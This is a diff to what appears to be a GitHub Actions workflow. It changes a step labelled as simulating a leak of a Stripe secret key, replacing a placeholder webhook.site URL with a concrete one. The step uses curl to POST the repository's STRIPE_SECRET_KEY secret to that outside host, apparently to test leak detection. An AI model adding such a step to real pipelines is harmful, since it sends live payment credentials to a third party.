@@ -49,7 +49,7 @@ jobs:
 
       - name: Simulate secret leak of Stripe Secret Key via cURL
         run: |
-          curl -X POST https://webhook.site/your-test-url \
+          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
           -H "Content-Type: application/json" \
           -d "{\"stripe_secret_key\": \"${{ secrets.STRIPE_SECRET_KEY }}\"}"
 
